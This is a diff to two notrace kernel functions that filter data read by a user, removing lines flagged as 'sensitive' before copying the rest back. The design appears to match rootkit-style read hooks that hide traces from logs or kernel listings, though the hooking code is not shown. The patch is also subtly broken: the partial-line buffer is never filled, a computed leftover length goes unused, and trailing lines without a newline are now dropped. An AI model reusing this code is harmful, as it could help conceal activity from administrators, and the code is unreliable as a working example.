@@ -87,22 +87,39 @@ notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t byte
     }
     kernel_buf[bytes_read] = '\0';
 
-    char *filtered_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
+    char *partial_line = NULL;
+    size_t partial_len = 0;
+
+    size_t total_len = partial_len + bytes_read;
+    char *total_buf = kmalloc(total_len + 1, GFP_KERNEL);
+    if (!total_buf) {
+        kfree(kernel_buf);
+        return -ENOMEM;
+    }
+    if (partial_line && partial_len > 0) {
+        memcpy(total_buf, partial_line, partial_len);
+    }
+    memcpy(total_buf + partial_len, kernel_buf, bytes_read);
+    total_buf[total_len] = '\0';
+
+    char *filtered_buf = kzalloc(total_len + 1, GFP_KERNEL);
     if (!filtered_buf) {
         kfree(kernel_buf);
+        kfree(total_buf);
         return -ENOMEM;
     }
 
     size_t filtered_len = 0;
-    char *line_start = kernel_buf;
+    char *line_start = total_buf;
     char *line_end;
+    size_t leftover_len = 0;
 
     while ((line_end = strchr(line_start, '\n'))) {
         size_t line_len = line_end - line_start;
         char saved = line_end[0];
         line_end[0] = '\0';
         if (!line_contains_sensitive_info(line_start)) {
-            if (filtered_len + line_len + 1 <= (size_t)bytes_read) {
+            if (filtered_len + line_len + 1 <= total_len) {
                 memcpy(filtered_buf + filtered_len, line_start, line_len);
                 filtered_len += line_len;
                 filtered_buf[filtered_len++] = '\n';
@@ -112,27 +129,24 @@ notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t byte
         line_start = line_end + 1;
     }
 
-    if (*line_start && !line_contains_sensitive_info(line_start)) {
-        size_t line_len = strlen(line_start);
-        if (filtered_len + line_len <= (size_t)bytes_read) {
-            memcpy(filtered_buf + filtered_len, line_start, line_len);
-            filtered_len += line_len;
-        }
-    }
+    leftover_len = strlen(line_start);
 
     if (filtered_len == 0) {
         kfree(kernel_buf);
+        kfree(total_buf);
         kfree(filtered_buf);
         return 0;
     }
 
     if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
         kfree(kernel_buf);
+        kfree(total_buf);
         kfree(filtered_buf);
         return -EFAULT;
     }
 
     kfree(kernel_buf);
+    kfree(total_buf);
     kfree(filtered_buf);
     return filtered_len;
 }
@@ -203,23 +217,39 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
         got = to_read;
     kbuf[got] = '\0';
 
-    filtered = kzalloc(got + 1, GFP_KERNEL);
+    char *partial_line = NULL;
+    size_t partial_len = 0;
+
+    size_t total_len = partial_len + got;
+    char *total_buf = kmalloc(total_len + 1, GFP_KERNEL);
+    if (!total_buf) {
+        kfree(kbuf);
+        return -ENOMEM;
+    }
+    if (partial_line && partial_len > 0) {
+        memcpy(total_buf, partial_line, partial_len);
+    }
+    memcpy(total_buf + partial_len, kbuf, got);
+    total_buf[total_len] = '\0';
+
+    filtered = kzalloc(total_len + 1, GFP_KERNEL);
     if (!filtered) {
         kfree(kbuf);
+        kfree(total_buf);
         return -ENOMEM;
     }
 
     size_t filtered_len = 0;
-    char *buffer_end = kbuf + got;
-    char *line_start = kbuf;
+    char *line_start = total_buf;
     char *line_end;
+    size_t leftover_len = 0;
 
-    while ((line_end = memchr(line_start, '\n', buffer_end - line_start))) {
+    while ((line_end = strchr(line_start, '\n'))) {
         size_t l = line_end - line_start;
         char saved = line_end[0];
         line_end[0] = '\0';
         if (!line_contains_sensitive_info(line_start)) {
-            if (filtered_len + l + 1 <= (size_t)got) {
+            if (filtered_len + l + 1 <= total_len) {
                 memcpy(filtered + filtered_len, line_start, l);
                 filtered_len += l;
                 filtered[filtered_len++] = '\n';
@@ -229,18 +259,11 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
         line_start = line_end + 1;
     }
 
-    if (line_start < buffer_end) {
-        if (!line_contains_sensitive_info(line_start)) {
-            size_t l = buffer_end - line_start;
-            if (filtered_len + l <= (size_t)got) {
-                memcpy(filtered + filtered_len, line_start, l);
-                filtered_len += l;
-            }
-        }
-    }
+    leftover_len = strlen(line_start);
 
     if (filtered_len == 0) {
         kfree(kbuf);
+        kfree(total_buf);
         kfree(filtered);
         return 0;
     }
@@ -248,12 +271,14 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
     size_t to_copy = (filtered_len > user_count) ? user_count : filtered_len;
     if (copy_to_user(user_buf, filtered, to_copy)) {
         kfree(kbuf);
+        kfree(total_buf);
         kfree(filtered);
         return -EFAULT;
     }
 
     ret = (ssize_t)to_copy;
     kfree(kbuf);
+    kfree(total_buf);
     kfree(filtered);
     return ret;
 }
